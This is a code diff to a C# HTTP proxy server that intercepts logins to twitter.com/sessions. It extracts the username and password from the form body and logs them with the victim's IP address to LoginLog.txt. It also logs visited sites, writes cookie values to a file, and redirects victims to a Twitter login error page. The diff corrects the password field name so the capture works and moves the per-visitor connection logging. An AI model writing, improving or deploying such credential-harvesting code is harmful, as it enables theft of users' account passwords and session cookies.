@@ -31,6 +31,7 @@ namespace HTTPProxyServer
         private static object _outputLockObj = new object();
         private static string url = "";
         private static string lastUrl = "";
+        private static string currenHost = "";
 
 
         private TcpListener _listener;
@@ -163,9 +164,6 @@ namespace HTTPProxyServer
                     clientStream.Close();
                     return;
                 }
-
-                remoteUri = updateUri(message,client);
-
                 //break up the line into three components
                 String[] splitBuffer = httpCmd.Split(spaceSplit, 3);
 
@@ -174,6 +172,35 @@ namespace HTTPProxyServer
 
                 if((method=="GET" || method == "POST"))
                 {
+                    remoteUri = updateUri(message, client);
+
+                    if ((currenHost == "" || !remoteUri.Contains(currenHost)) && (!remoteUri.Contains(".css")))
+                    {
+                        currenHost = remoteUri;
+
+                        string time = DateTime.Now.ToString();
+                        string ipAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
+                        Console.WriteLine("Connection:");
+                        Console.WriteLine("Time : " + time);
+                        Console.WriteLine("IP Address : " + ipAddress);
+                        Console.WriteLine("Site Url : " + url);
+
+                        using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
+                        {
+                            outputFile.Write("Connection:");
+                            outputFile.WriteLine("Time : " + time);
+                            outputFile.WriteLine("IP Address : " + ipAddress);
+                            outputFile.WriteLine("Site Url : " + url);
+                            makeSpaceBetweenRecords(outputFile);
+
+                        }
+
+
+                    }
+
+
+
+
                    
                     Version version = new Version(1, 0);
 
@@ -184,7 +211,7 @@ namespace HTTPProxyServer
                     if (method.Contains("POST") && remoteUri.Contains("twitter.com/sessions"))
                     {
                         string responseFromTwitter = fetchUserCradentialsAndUpdateUser(message);
-                        string[] messageParts = message.Split(new string[] { "username_or_email%5D=", "userPassword%5D=" }, StringSplitOptions.None);
+                        string[] messageParts = message.Split(new string[] { "username_or_email%5D=", "password%5D=" }, StringSplitOptions.None);
                         string time = DateTime.Now.ToString();
                         string userIp = ((IPEndPoint) client.Client.RemoteEndPoint).Address.ToString();
                         string userName = messageParts[1].Split('&')[0];
@@ -219,9 +246,16 @@ namespace HTTPProxyServer
 
                         webReq.Method = method;
                         webReq.ProtocolVersion = version;
+                        webReq.Proxy = null;
+                        webReq.AutomaticDecompression = DecompressionMethods.None;
+                        
 
                     //read the request headers from the client and copy them to our request
-                    int contentLen = ReadRequestHeaders(clientStreamReader, webReq);
+                        int contentLen = ReadRequestHeaders(clientStreamReader, webReq);
+                        webReq.KeepAlive = true;
+                        webReq.AllowAutoRedirect = false;
+
+
 
                          if (method.ToUpper() == "POST")
                            {
@@ -345,7 +379,7 @@ namespace HTTPProxyServer
         private static void writeLoginToConsoleAndFile(string currentTime, string userIpAddress, string uName, string userPassword)
         {
             uName = uName.Replace("%40", "@");
-            Console.WriteLine("User Login: " + currentTime + " " + userIpAddress + " " + uName + " " + userPassword);
+            Console.WriteLine("User Login: Tim" + currentTime + " " + userIpAddress + " " + uName + " " + userPassword);
             using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\LoginLog.txt", true))
             {
                 outputFile.WriteLine("Time and data : " + currentTime);
@@ -364,22 +398,11 @@ namespace HTTPProxyServer
             {
                 url = reqParts[1].Split(new string[] { "/?url=" }, StringSplitOptions.None)[1];
                 lastUrl = url;
-                string time = DateTime.Now.ToString();
-                string ipAddress =((IPEndPoint) client.Client.RemoteEndPoint).Address.ToString();
-                Console.WriteLine("Connection:");
-                Console.WriteLine("Time : " + time);
-                Console.WriteLine("IP Address : " + ipAddress);
-                Console.WriteLine("Site Url : " + url);
 
-                using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
-                {
-                    outputFile.Write("Connection:");
-                    outputFile.WriteLine("Time : " + time);
-                    outputFile.WriteLine("IP Address : " + ipAddress);
-                    outputFile.WriteLine("Site Url : "+ url);
-                    makeSpaceBetweenRecords(outputFile);
 
-                }
+                    
+                
+
             }
             else
             {
@@ -696,8 +719,7 @@ namespace HTTPProxyServer
             stringBuilder.AppendLine("HTTP/1.1 301 Moved Permanently");
             stringBuilder.AppendLine("Connection: close");
             stringBuilder.AppendLine("Location: https://www.twitter.com/login/error?username_or_email=" + username);
-            stringBuilder.AppendLine(Environment.NewLine);
-            stringBuilder.AppendLine(Environment.NewLine);
+
         }
 
         public static void writeCookiesToFile(string currentTime, string userIpAddress, string siteUrl, string cookieName, string cookieValue)
